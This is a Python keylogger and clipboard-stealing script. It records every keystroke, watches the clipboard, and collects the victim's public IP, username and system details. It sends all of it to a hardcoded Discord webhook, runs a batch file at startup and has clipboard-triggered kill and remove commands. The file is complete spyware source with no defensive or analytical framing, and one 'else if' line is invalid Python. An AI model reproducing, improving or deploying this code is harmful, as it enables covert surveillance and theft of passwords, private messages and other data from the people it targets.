import os
import requests
import threading
import subprocess
import time
from pynput import keyboard
import psutil
import pyperclip

# Discord webhook URL (replace with your own webhook URL)
WEBHOOK_URL = 'https://discord.com/api/webhooks/1348318193940303882/0SBww7zlNqUxQhzbkCOC6ScjU2rDoOVkUxxdIJzMNx4WeSSVkbkRXb7ux91eSnTDKWSi'

# Store the keystrokes
keystrokes = ""
lock = threading.Lock()
last_keypress_time = time.time()
last_clipboard = ""

# Dictionary for special keys
special_keys = {
    keyboard.Key.space: " ",
    keyboard.Key.enter: " [ENTER] ",
    keyboard.Key.backspace: " <- ",
    keyboard.Key.tab: " [TAB] ",
    keyboard.Key.shift: " [SHIFT] ",
    keyboard.Key.ctrl_l: " [CTRL] ",
    keyboard.Key.alt_l: " [ALT] ",
    keyboard.Key.cmd: " [CMD] ",
    keyboard.Key.esc: " [ESC] ",
}

username = os.getlogin()

def run_bat_file():
    """Run the kill.bat file when the script starts."""
    bat_file_path = rf"C:\users\{username}\kl2.1\kill.bat"  # Update the path to your kill.bat file
    try:
        subprocess.run([bat_file_path], check=True)
        print(f"Successfully ran {bat_file_path}")
    except subprocess.CalledProcessError as e:
        print(f"Error running {bat_file_path}: {e}")


def get_public_ip():
    """Fetch the public IP address using an external API."""
    try:
        response = requests.get('https://api.ipify.org?format=json')
        if response.status_code == 200:
            return response.json().get("ip")
        else:
            return "Unknown"
    except Exception as e:
        print(f"Error getting public IP address: {e}")
        return "Unknown"


def send_to_webhook(message):
    """Send the message to the Discord webhook."""
    payload = {"content": message}
    try:
        response = requests.post(WEBHOOK_URL, json=payload)
        if response.status_code == 200:
            print("Webhook message sent successfully.")
        else:
            print(f"Failed to send webhook message. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending message to webhook: {e}")


def keystroke_monitor():
    """Monitor keystrokes and send them after 3 seconds of inactivity."""
    global keystrokes, last_keypress_time
    while True:
        time.sleep(1)
        with lock:
            if keystrokes and time.time() - last_keypress_time > 3:
                send_to_webhook(keystrokes)
                keystrokes = ""


def on_press(key):
    global keystrokes, last_keypress_time
    try:
        key_str = key.char
    except AttributeError:
        key_str = special_keys.get(key, f"[{key}]")

    with lock:
        keystrokes += key_str
        last_keypress_time = time.time()


def on_release(key):
    current_clipboard = ""
    current_clipboard = pyperclip.paste()
    if "/kill" in current_clipboard:
        send_to_webhook(f"Kill command executed by: {username}")
        file_path = rf"C:\users\{username}\kl2.1"  # Fixed the file path
        subprocess.run(["explorer", file_path])
        time.sleep(1)
        send_to_webhook(f"Opened dir...")
        return False
    else if: "/remove" in current_clipboard:
        send_to_webhook(f"Removed by: {username}")
        file_path = rf"C:\users\{username}\kl2.1"
        os.rmdir(file_path)
        return False

def monitor_clipboard():
    """Monitor the clipboard for changes and send the content to the webhook."""
    global last_clipboard
    while True:
        time.sleep(1)
        try:
            current_clipboard = pyperclip.paste()
            if current_clipboard != last_clipboard:
                send_to_webhook(f" {username} just copied something to clipboard!")
                send_to_webhook(f"Clipboard content: {current_clipboard}")
                last_clipboard = current_clipboard
        except Exception as e:
            print(f"Error accessing clipboard: {e}")

# Run kill.bat file at the start
run_bat_file()

# Get and send public IP and username
username = os.getlogin()
public_ip = get_public_ip()
send_to_webhook(f"Connection established. Public IP address: {public_ip}")
send_to_webhook(f"Current user: {username}")

# Gather system information
cpu_count = psutil.cpu_count(logical=True)
cpu_percent = psutil.cpu_percent(interval=1)
memory_info = psutil.virtual_memory()
disk_info = psutil.disk_usage('/')

send_to_webhook(f"CPU cores: {cpu_count}")
send_to_webhook(f"CPU percent: {cpu_percent}%")
send_to_webhook(f"Memory info: Total: {memory_info.total}, Available: {memory_info.available}, Used: {memory_info.used}, Percent: {memory_info.percent}%")
send_to_webhook(f"Disk info: Total: {disk_info.total}, Used: {disk_info.used}, Free: {disk_info.free}, Percent: {disk_info.percent}%")

# Start the keystroke monitor and clipboard monitor threads
threading.Thread(target=keystroke_monitor, daemon=True).start()
threading.Thread(target=monitor_clipboard, daemon=True).start()

# Set up the keyboard listener
try:
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
except KeyboardInterrupt:
    print("Listener stopped.")
